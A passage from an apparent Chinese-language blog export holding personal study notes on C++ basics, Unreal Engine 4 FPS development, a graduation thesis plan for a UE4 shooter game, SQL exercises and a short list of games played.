class="token comment">// 3.打开文件</span>Person p <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">"张三"</span><span class="token punctuation">,</span><span class="token number">18</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">// 写文件</span>ofs<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>p<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 关闭文件</span>ofs<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">test03</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><ul><li><p>二进制读 <pre class="language-cpp" data-language="cpp"><code class="language-cpp">istream<span class="token operator">&amp;</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></p></li><li><p>职工管理系统 &gt; case 语句里：代码过长需要用“{}”括起来。 &gt;<code>ios::trunk</code>:删除文件后重新创建</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Programming Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> 核心 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c++基础（B站黑马）</title>
      <link href="/2021/12/31/c-ji-chu/"/>
      <url>/2021/12/31/c-ji-chu/</url>
      
        <content type="html"><![CDATA[<h2 id="常量定义的两种方式">常量定义的两种方式</h2><blockquote><ul><li>#define 定义常量：<code>#define 常量名 常量值</code>，<br /><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">day</span> <span class="token expression"><span class="token number">7</span>  </span></span></code></pre></li></ul></blockquote><blockquote><ul><li><code>const 数据类型 常量名 = 常量值</code>,<br /><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">const</span> <span class="token keyword">int</span> month <span class="token operator">=</span> <span class="token number">30</span></code></pre></li></ul></blockquote><h2 id="数据类型存在的意义">数据类型存在的意义</h2><blockquote><ul><li>给变量分配合适的内存空间</li><li>sizeof（数据类型/变量）</li><li>浮点型<ul><li>float: 3.14默认为双精度，3.14f则为单精度</li><li>小数默认6位有效数字</li></ul></li><li>char型：char ch = 'a'(注意单引号)</li><li>转义字符</li><li>string 头文件</li></ul></blockquote><h2 id="运算符">运算符</h2><blockquote><ul><li>三目运算符返回的是一个变量</li></ul></blockquote><h2 id="结构">结构</h2><blockquote><ul><li>switch 结构清晰，执行效率高，判断整型或字符型，不可是一个区间</li><li>随机数种子，利用当前系统时间生成随机数，防止每次随机数都一样<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;ctime></span></span><span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">100</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span></code></pre></li><li>cotinue 退出<strong>本次</strong>循环</li><li>goto<br /><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">goto</span> FLAG<span class="token punctuation">;</span>FLAG<span class="token operator">:</span></code></pre></li></ul></blockquote><h2 id="函数">函数</h2><blockquote><ul><li>形参不影响实参，占据不同地址</li><li>函数的声明可以多次，定义只能有一次。</li><li>.h头文件，.cpp源文件</li><li>封装</li><li>system("pause")</li></ul></blockquote><h2 id="指针">指针</h2><blockquote><ul><li>指针存储的是地址</li><li>解引用</li><li>指针，32bit占用4个字节,64bit占用8个字节</li><li>空指针，指向编号为0的内存块<ul><li>给指针变量进行初始化</li><li>空指针指向的内存不可访问（0-255之间的内存编号系统占用）</li></ul></li><li>野指针，指向非法的内存空间 <pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>ox1100<span class="token punctuation">;</span></code></pre>空指针和野指针都不是我们申请的空间，因此不要访问。</li><li>const与指针<ul><li>修饰指针，常量指针，<code>const int *p = &amp;a;</code>指针的指向可以修改，指向的值不可以修改。</li><li>修饰常量，指针常量，<code>int *const p = &amp;a;</code>指向的值可以改，指向不可以改。</li><li>双修饰</li></ul></li></ul></blockquote><blockquote><ul><li>指针与函数<ul><li>传地址，形参与实参指向同一个地址。</li></ul></li></ul></blockquote><blockquote><p><strong>函数指针</strong>：typedef int (*fun_ptr)(int,int); //声明一个指向同样参数、返回值的函数指针类型</p></blockquote><ul><li><strong>回调函数</strong> &gt; 函数指针作为某个函数的参数 &gt;函数指针变量可以作为某个函数的参数来使用的，回调函数就是一个通过函数指针&gt;调&gt;用的函数。</li></ul><blockquote><p>简单讲：回调函数是由别人的函数执行时调用你实现的函数。</p></blockquote><blockquote><p>以下是来自知乎作者常溪玲的解说：</p></blockquote><blockquote><p>你到一个商店买东西，刚好你要的东西没有货，于是你在店员那里留下了你的话，&gt;过了几天店里有货了，店员就打了你的电话，然后你接到电话后就到店里去取货。在这个例子里，你的电话号码就叫回调函数，你把电话留给店员就叫登记回调函数，店里后来有货了叫做触发了回调关联的事件，店员给你打电话叫做调用回调函数，你到店里去取货叫做响应回调事件。</p></blockquote><h2 id="结构体">结构体</h2><blockquote><ul><li>创建变量时，<code>struct</code>可省略。</li><li>结构体指针</li><li>形参改为指针，减少地址空间</li></ul></blockquote><h2 id="通讯录管理系统">通讯录管理系统</h2><blockquote><ul><li>void ShowMenu()</li><li>switch 选择功能</li><li>添加联系人功能</li><li><code>#define MAX 1000</code>报错，根据提示更改为<code>constexpr auto MAX = 1000;</code>后提示正确</li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">default</span><span class="token operator">:</span><span class="token keyword">break</span><span class="token punctuation">;</span></code></pre><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></blockquote><h2 id="main函数理解">main函数理解</h2><ul><li>对<code>int main(argc,argv* [])</code>中两个参数的理解</li></ul><h2 id="修补">修补</h2><ul><li><p><code>printf("%s",p)</code>: %s,<del>s%</del></p></li><li><p>(int*)(74):74号地址</p></li></ul><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span><span class="token operator">*</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token number">74</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将整型强制转化为地址</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>                              <span class="token comment">// 十进制输出 74</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"返回值是："</span> <span class="token operator">&lt;&lt;</span> p <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token comment">// 0000004A   </span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"返回值是："</span> <span class="token operator">&lt;&lt;</span> <span class="token operator">&amp;</span>p <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">// 005EF780</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"返回值是："</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>p <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">// 74</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span><span class="token operator">*</span> a <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>a<span class="token punctuation">;</span>         <span class="token comment">// 将5强转为地址</span><span class="token keyword">int</span><span class="token operator">*</span> q <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>a<span class="token punctuation">;</span>        <span class="token comment">// 将a的地址强转为指针</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Programming Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>那些年玩过的游戏</title>
      <link href="/2021/04/29/elegame/"/>
      <url>/2021/04/29/elegame/</url>
      
        <content type="html"><![CDATA[<h3 id="epic">EPIC</h3><ol type="1"><li>Bycz1997r</li></ol><h2 id="gta5">GTA5</h2><h2 id="只狼">只狼</h2><figure><imgsrc="C:/Users/liu%20haihua/AppData/Roaming/Typora/typora-user-images/image-20220513210646793.png"alt="image-20220513210646793" /><figcaption aria-hidden="true">image-20220513210646793</figcaption></figure><figure><imgsrc="C:/Users/liu%20haihua/AppData/Roaming/Typora/typora-user-images/image-20220513210737095.png"alt="image-20220513210737095" /><figcaption aria-hidden="true">image-20220513210737095</figcaption></figure><h2 id="巫师3">巫师3</h2><h2 id="英雄联盟">英雄联盟</h2><h2 id="csgo">CS:GO</h2><h2 id="穿越火线">穿越火线</h2><h2 id="皇室战争">皇室战争</h2>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Easygoing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tip</title>
      <link href="/2021/04/22/tip/"/>
      <url>/2021/04/22/tip/</url>
      
        <content type="html"><![CDATA[<h2 id="流程图">流程图</h2><h3 id="流程图各种形状意义">流程图各种形状意义</h3><p><a href="https://www.sohu.com/a/236178167_505826"class="uri">https://www.sohu.com/a/236178167_505826</a></p>]]></content>
      
      
      <categories>
          
          <category> Tip </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>虚幻4-FPS游戏开发</title>
      <link href="/2021/04/13/xu-huan-4-c-you-xi-kai-fa/"/>
      <url>/2021/04/13/xu-huan-4-c-you-xi-kai-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="游戏控制的摄像机上">03 游戏控制的摄像机上</h2><ul><li>学习资料：<a href="https://www.bilibili.com/video/BV14K411J7v2?p=1"class="uri">https://www.bilibili.com/video/BV14K411J7v2?p=1</a></li></ul><blockquote><p>镜头切换UPROPERTY、EditAnwhere、获取玩家控制器（PlayerController）</p></blockquote><h2 id="游戏控制摄像机下">04 游戏控制摄像机下</h2><blockquote><p>DeltaTime:</p></blockquote><h2 id="uproperty的作用">UPROPERTY的作用</h2><blockquote><p>宏（属性说明符）</p></blockquote><h2id="ue4中组件的概念和基本继承关系">UE4中组件的概念和基本继承关系</h2><blockquote><p>Actor:拖放 组件 静态网格体，显示物体的形状 场景组件RootComponent：存储位置信息 C++继承关系</p></blockquote><h2 id="第一人称射击游戏教程">第一人称射击游戏教程</h2><blockquote><p>GameMode:游戏条件、游戏设定 代码写好后创建蓝图子类、设置模式实现角色：Character类（派生自pawn），将该类扩充为蓝图，设置Defaultpwan,super: 设置轴映射：输入相关<br />1. Action操作映射：离散操作，长按 2. Axis轴映射：连续的 3.scale正负区分方向 实现角色移动：UFUNCTION()处理函数：标识符MoveFoward:获取x轴、AddMovementInput(Value值)SetupPlayerComponent:绑定函数</p></blockquote><h3 id="实现平滑镜头移动pitch-yaw-roll">实现平滑镜头移动：Pitch YawRoll</h3><blockquote><p>Turn、LookUpPitch:绕x轴旋转，Yaw:绕Y轴旋转，Roll：绕Z轴旋转（虚幻引擎：左手坐标系）</p></blockquote><h3 id="设置人物模型">设置人物模型</h3><h3 id="更改摄像机视图">更改摄像机视图</h3><blockquote><p>组件，引入头文件 添加到胶囊体组件</p></blockquote><h3 id="为角色添加第一人称模型">为角色添加第一人称模型</h3><blockquote><p>在身体正前方：添加手臂</p></blockquote><h3 id="fps游戏发射物的实现">FPS游戏发射物的实现</h3><blockquote><p>Action Mappings 新建Actor 球体碰撞组件、发射物运动组件、发射物初速度细节面板更改属性参数 新建碰撞预设</p></blockquote><h3 id="在视口中添加准星">在视口中添加准星</h3><blockquote><p>不推荐代码</p></blockquote><h3 id="使用c和ui交互">使用C++和UI交互</h3><blockquote><p>Cast to FirstPersonCharacter</p></blockquote><h3 id="销毁物体">销毁物体</h3><blockquote><p>子弹击中，销毁物体 调用碰撞：OnComponentbeginOverlap被击打物体强制转化为子弹类型，即被击中，就自动销毁设置碰撞事件、产生overlap</p></blockquote><h2 id="循环不断生成物体">循环不断生成物体</h2><blockquote><p>位置 TSubclassOf 模板类</p></blockquote><h2 id="玩家输入和pawn">玩家输入和pawn</h2><h2 id="变量定时器和事件">变量、定时器和事件</h2><blockquote><p>SetTimer 公开函数 调用父类实现 调用C++父类&amp;蓝图子类</p></blockquote><hr /><p><em><strong>中级教程</strong></em></p><h2 id="组件和碰撞1">组件和碰撞1</h2><blockquote><p>SetCollisonProfileName 碰撞预设 加载硬盘资源</p></blockquote><h2 id="组件和碰撞2">组件和碰撞2</h2><blockquote><p>开火效果组件 组件创建好后是否激活 弹簧臂</p></blockquote><h2 id="组件和碰撞3">组件和碰撞3</h2><blockquote><p>PawnMovenment</p></blockquote><h2 id="玩家控制的相机上完成版">玩家控制的相机上完成版</h2><blockquote><p>根组件、弹簧臂、摄像机</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Game Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> 虚幻4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕业设计</title>
      <link href="/2021/04/06/bi-ye-she-ji-xu-yao/"/>
      <url>/2021/04/06/bi-ye-she-ji-xu-yao/</url>
      
        <content type="html"><![CDATA[<h2 id="论文题目">论文题目</h2><blockquote><p>UE4引擎下射击类游戏的设计与开发</p></blockquote><h2 id="论文内容格式">论文内容格式</h2><blockquote><p>“概念+现状+问题+建议” 提出问题,解决概念,分析问题,提出建议</p></blockquote><h2 id="毕设初次分析">毕设初次分析</h2><blockquote><ol type="1"><li>UE4 playerpawn和botpawn</li><li>摄像机组件控制视野，C++ 代码实现</li><li>UE4 characters:Fpp和Tpp</li><li>online/ C++ GameMode在:ShooterGame_menu,UI,创建游戏和加入游戏</li><li>player/ShooterPlayerCameraManager: 继承UpdateCamera,DefaultFov,摄像机类型，UpdateCamera视角更新计算，UE4/source/runtime/engine/private/playerCameraManager.cpp:UpdateViwtarget,定义：查看轨道动画</li><li>蓝图和c++实现，场景，UE4+vs2019</li><li>论文设计目标：基于虚幻4游戏引擎和VS2019开发一个多人的射击游戏,带来较为逼真的游戏体验，通过本次设计，深入学习虚幻4游戏引擎，主要是涉及虚幻4编辑器的使用、蓝图的编写、角色与场景制作，体会游戏的制作逻辑，同时学习并实现网络通信，利用VS2019进一步学习C++编程。与此同时，对虚幻引擎和VS2019之间的连接关系有更深刻体会。</li><li>内容：角色创建，为游戏导入需要的动画与音效，为角色绑定控制器实现角色控制，游戏菜单UI的制作，游戏碰撞击与打效果的实现，场景搭建，武器设计系统的实现，玩家武器库的制作，玩家相机系统的实现，在线多人游戏系统的实现，菜单系统和其中选项菜单的实现，主要通过蓝图编程和c++编程实现特定功能。</li><li>参考文献：<br />[1]黄冈.基于虚幻引擎的FPS游戏开发与设计 .青海师范大学 .2020<br />[2]朱悦.基于UE4的射击类手机游戏系统的设计与实现 .华中科技大学 .2018[3]朱阅晗; 张海翔; 马文娟基于虚幻4引擎的三维游戏开发实践 2017[4]高海阳.基于Unreal Engine 3 的RPG射击游戏开发.吉林大学 .2015[5]谢飏霄.虚幻引擎下的次时代游戏场景射击研究[D].浙江工业大学，2018[6]沈士钊.基于Unity3D引擎的三维角色扮演游戏设计与实现[D].华中科技大学，2017[7]郑帅.基于Socket的游戏服务器的设计与实现[D].背景交通大学，2014.[8]郝运.行为树驱动的人工智能决策模型设计与实现[D].西南交通大学，2017.[9]郭东方.基于unity3D坦克战争游戏的设计与实现[D].河北科技大学.2017.[10]黄杨煜.基于实时全局光照的3D绘制引擎研究和开发[D].北京化工大学，2015.</li></ol></blockquote><h2 id="毕设所需">毕设所需：</h2><blockquote><p>资源引用、目录结构、游戏模块 <imgsrc="/images/游戏型编程参考目录.png" alt="游戏型编程参考目录." />游戏控制的摄像机 组件和碰撞 建立第一人称射击游戏教程项目 蓝图可视化脚本Ue4中的C++ 游戏逻辑编程 GamePlay 框架（游戏流程、控制器、）多人游戏（在单人游戏或本地多人游戏中，游戏在 独立游戏上本地运行。玩家将输入连接到一台计算机，直接控制其上所有内容，而包括Actor、场景和各玩家的用户界面在内的所有游戏项目均存在于这台本地机器上。）AI（EQS） slate UI框架 GamePlay 入门指南 UMG UI设计器 Game框架反射实现来支持动态功能，如垃圾回收、序列化、网络复制和蓝图/C++通信。在线子系统 场景搭建、碰撞 物理（碰撞） 输入 使用计时器多人游戏编程快速入门指南</p></blockquote><h2 id="论文目录技术部分">论文目录技术部分</h2><blockquote><p>chaper2:引擎，蓝图可视化，AI，网络模式 chapter4:1：服务器作用：玩家交互数据的广播，同步</p></blockquote><p>2：玩家数据存储</p><p>3：做好验证，防止外挂</p><p>4：交互的流畅性</p><p>4.3 客户端的设计<br />4.3.1 游戏主菜单设计 ## 编程基础 &gt;1. <ahref="https://docs.unrealengine.com/zh-CN/ProgrammingAndScripting/ProgrammingWithCPP/Basics/index.html"class="uri">https://docs.unrealengine.com/zh-CN/ProgrammingAndScripting/ProgrammingWithCPP/Basics/index.html</a></p><h2 id="游戏逻辑编程">游戏逻辑编程</h2><blockquote><ol type="1"><li><ahref="https://docs.unrealengine.com/zh-CN/ProgrammingAndScripting/ProgrammingWithCPP/UnrealArchitecture/index.html"class="uri">https://docs.unrealengine.com/zh-CN/ProgrammingAndScripting/ProgrammingWithCPP/UnrealArchitecture/index.html</a></li></ol></blockquote><h2 id="tip">Tip</h2><blockquote><ol type="1"><li>任何蓝图项目均可转换为C++项目。 ## 修改 删除游戏特效</li></ol></blockquote><h2 id="开题报告">开题报告</h2><blockquote><ol type="1"><li>选题目的和意义现如今，电子竞技行业正如火如荼地在全世界范围内盛行，除了专业的职业选手外，游戏也已经融入到人们工作学习之余不可或缺的娱乐生活，尽管普通玩家只在闲暇时间享受游戏，但是他们对游戏品质和玩法的追求也越来越高，现在越来越多的玩家倾向与选择射击型游戏与好友一起游玩，大多数的游戏玩家都是年轻一代，从画质到帧数、渲染、模式的多样性、操作性、对抗性和画面的真实感，他们都有着较高的需求，因此基于虚幻引擎去开发这么一款游戏是非常适合的。</li><li>国内外研究现状 虚幻引擎是由Epic Games公司推出的一款游戏开发引擎，它支持DirectX 11、物理引擎Physx、APEX和NVIDIA3D技术，支持二代机。虚幻引擎有着强大的骨骼动画系统、物理学碰撞系统和友好的编辑界面、逼真的渲染效果，并且免费开源，可以发布至Windows、Linux、IOS、Android等流行平台。目前，全球虚幻引擎用户数已经突破了1000万人，目前占有全球商业游戏引擎市场80%的份额。基于虚幻引擎开发的游戏大作数不胜数，有前两年火爆全球的《绝地求生》，还有《堡垒之夜》、《流星蝴蝶剑OL》和《剑灵》等等，尤其是《绝地求生》，刚上市一两年，风头就已经盖过了塔防类游戏代表作《英雄联盟》。国内《古剑奇谭》、《逆水寒》、《仙剑奇侠》也都是非常成功的游戏大作，可是在游戏引擎的研发上还是相对落后，例如我国网易公司研发的弥赛亚引擎、搜狐畅游研发“黑火”引擎和西山居研发的“剑三”引擎在动画系统、游戏框架、物理碰撞、人工智能等方面相较于上述的两款优质引擎仍存在较大差距。唯独在网页游戏的制作上，白鹭科技公司凭借自己建立的一套比较完整的游戏研发解决方案，在该领域有着一席之地。随着以PS4、WiiU、XboxOne等第八世代游戏机为平台的游戏作品问世，“次时代游戏”世代宣布到来。虚幻引擎凭借着实时逼真渲染、可视化脚本开发、健壮的游戏框架和先进的人工智能成为了次时代的主要游戏引擎。</li><li>研究内容学习虚幻引擎和主流引擎，设计和开发了一款单人和本地多人游戏；详细介绍游戏的设计开发流程，主要是UI界面和使用的网络模式，主要技术：蓝图可视化编程技术、UE4中的C++编程、多人游戏中的独立网络模式和主要游戏模块。</li></ol></blockquote><blockquote><ol start="4" type="1"><li>实施方案、进度安排及预期效果：</li></ol></blockquote><blockquote><p>实施方案： 1.尽可能多地查看相关文献和相关教程，对整体的游戏开发流程有更深入认知，并熟悉虚幻引擎的使用，巩固和复习相关技术知识，准备制作游戏的相关素材，例如场景地图、音频和动画等。2. 准备如下硬件和软件环境： 硬件：GTX1660ti-6G显卡，处理器Inteli5-9300h,运行内存8G,1T固态硬盘。开发环境为Windows 10系统。软件：虚幻引擎4，Visual Studio2019 3. 需求分析 4. 设计与实现 5. 游戏测试6. 论文写作</p></blockquote><blockquote><p>进度安排：2月份完成项目的前置工作，即方案中的1、2两点，4月份中旬前完成需求分析和实现，5月份前完成测试，5月中旬完成论文。</p></blockquote><blockquote><p>预期效果：当玩家启动游戏后，首先映入眼帘的便是游戏主菜单。在游戏主菜单中，玩家可以选择自己主持一局游戏，也可以通过局域网加入到其他玩家创建的游戏；也能在进入游戏前进行分辨率、窗口大小等基础设置。选择主持游戏选项，进入子菜单，玩家可以从个人竞技模式和团队竞技模式中选择其中一种模式，从两种地图种选择一种，同时可以设定机器人数量。在加入游戏选项中，如果附近有玩家创建了游戏，那么其它玩家就可以在此看到该房间服务器。在游戏中，玩家可以实现一系列的动作控制、战绩查看和进行聊天对话等操作。游戏结束弹出战绩排行。</p></blockquote><h2 id="毕业答辩20210522">毕业答辩2021/05/22</h2><h3 id="基础概念">基础概念</h3><ol type="1"><li>关卡：三维场景</li><li>Actor：编程类，放在关卡中的对象</li><li>光源</li><li>材质</li><li>蓝图</li><li>测试方法</li></ol><h3 id="要点">要点</h3><ol type="1"><li>设置游戏默认地图</li><li>添加碰撞</li><li>术语基本概念：<ahref="https://docs.unrealengine.com/zh-CN/Basics/UnrealEngineTerminology/index.html"class="uri">https://docs.unrealengine.com/zh-CN/Basics/UnrealEngineTerminology/index.html</a></li><li>AI组件</li><li>音频组件</li><li>摄像机组件</li><li>移动组件</li><li>寻路组件？？？</li><li>物理组件</li><li>渲染组件：Atmospheric Fog Component，Exponential Height FogComponen， &gt; DecalComponent是一个被渲染到网格模型表面上的材质（一种适用于模型的"保险杠标贴"）。贴花组件可用于任何目的，如发射子弹时在墙上撞出的痕迹，车辆在道路上擦出的打滑印记，被击中时在地上溅出的血迹等（下面有一个相关的示例）。&gt; ParticleSystemComponent可以让你添加一个粒子发射器作为其他对象的子对象。添加ParticleSystemComponent可用于多种目的，例如，为想要摧毁的对象添加爆炸效果，或是为可以点燃的对象增加着火效果。通过添加这类组件到其他对象，你便可以在游戏过程中借助脚本访问和设置任何粒子效果参数（例如打开或关闭效果）。</li><li>盒体组件，Spline Component （样条组件）</li><li>应用程序生命周期组件应用程序生命周期组件（ApplicationLifecycleComponent）处理从OS（操作系统）接收的关于应用程序的状态（开始、停止、结束等）的通知。子Actor组件（ChildActorComponent）是一个在注册时生成Actor并在取消注册时销毁Actor的组件。</li><li>蓝图和C++类：<ahref="https://docs.unrealengine.com/zh-CN/Basics/UnrealEngineForUnityDevs/index.html"class="uri">https://docs.unrealengine.com/zh-CN/Basics/UnrealEngineForUnityDevs/index.html</a></li><li>目录结构</li><li>事件（event）是一个入口，或者说是可视化脚本的第一个执行节点。该入口通常由游戏中的事件触发。</li><li>渲染：色温，材质，抗锯齿，曝光，泛光，阴影，色差，材质，着色，GPU粒子</li><li>C++控制摄像机</li><li>基于C++类创建蓝图（扩展类到蓝图）</li><li>创建动画蓝图</li><li>UMG:创建菜单控件蓝图<br /></li><li></li></ol><h3 id="编程相关">编程相关</h3><ol type="1"><li>NewObject 用于新建 UObject 类型的实例，而 SpawnActor 用于新建 AActor类型的实例。</li><li>我们使用 Instantiate 函数来新建对象的实例。</li><li>'check()' 函数来触发严重的断言错误</li><li>断言： 虚幻引擎4（UE4）提供 assert等同项的三个不同族系：check、verify 和 ensure</li></ol>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚幻4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sql</title>
      <link href="/2021/04/05/sql-yu-yan/"/>
      <url>/2021/04/05/sql-yu-yan/</url>
      
        <content type="html"><![CDATA[<blockquote><p>学习网站：<a href="http://xuesql.cn/"class="uri">http://xuesql.cn/</a></p></blockquote><h2 id="sql-lesson-10-在查询中进行统计i-pt.-1">SQL Lesson 10:在查询中进行统计I (Pt. 1)</h2><p><a href="http://xuesql.cn/lesson/select_queries_with_aggregates"class="uri">http://xuesql.cn/lesson/select_queries_with_aggregates</a>&gt;4. 【难题】每栋办公室按人数排名,不要统计无办公室的雇员</p><p>表格部分：</p><table><thead><tr class="header"><th>Role</th><th>Name</th><th>Building</th><th>Years_employed</th></tr></thead><tbody><tr class="odd"><td>Engineer</td><td>Becky A.</td><td>1e</td><td>4</td></tr><tr class="even"><td>Engineer</td><td>Dan B.</td><td>1e</td><td>2</td></tr><tr class="odd"><td>Engineer</td><td>Sharon F.</td><td>1e</td><td>6</td></tr><tr class="even"><td>Engineer</td><td>Dan M.</td><td>1e</td><td>4</td></tr><tr class="odd"><td>Engineer</td><td>Malcom S.</td><td>1e</td><td>1</td></tr><tr class="even"><td>Artist</td><td>Tylar S.</td><td>2w</td><td>2</td></tr><tr class="odd"><td>Artist</td><td>Sherman D.</td><td>2w</td><td>8</td></tr><tr class="even"><td>Artist</td><td>Jakob J.</td><td>2w</td><td>6</td></tr><tr class="odd"><td>Artist</td><td>Lillia A.</td><td>2w</td><td>7</td></tr><tr class="even"><td>Artist</td><td>Brandon J.</td><td>2w</td><td>7</td></tr></tbody></table><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> BUILDING<span class="token punctuation">,</span><span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token keyword">FROM</span> employees<span class="token keyword">WHERE</span> BUILDING <span class="token operator">IS</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token keyword">GROUP</span> <span class="token keyword">BY</span> BUILDIN</code></pre><h2 id="笔记">笔记</h2><blockquote><ol type="1"><li><code>GROUP</code> BY的拼写</li><li>符合题意的元组有多个<ahref="https://www.nowcoder.com/practice/ec1ca44c62c14ceb990c3c40def1ec6c?tpId=82&amp;tqId=29754&amp;rp=1&amp;ru=%2Fta%2Fsql&amp;qru=%2Fta%2Fsql%2Fquestion-ranking&amp;tab=answerKey"class="uri">https://www.nowcoder.com/practice/ec1ca44c62c14ceb990c3c40def1ec6c?tpId=82&amp;tqId=29754&amp;rp=1&amp;ru=%2Fta%2Fsql&amp;qru=%2Fta%2Fsql%2Fquestion-ranking&amp;tab=answerKey</a>关键字的拼写</li></ol></blockquote><h2 id="sql-lesson-11-在查询中进行统计ii-pt.-2">SQL Lesson 11:在查询中进行统计II (Pt. 2)</h2><blockquote><p><a 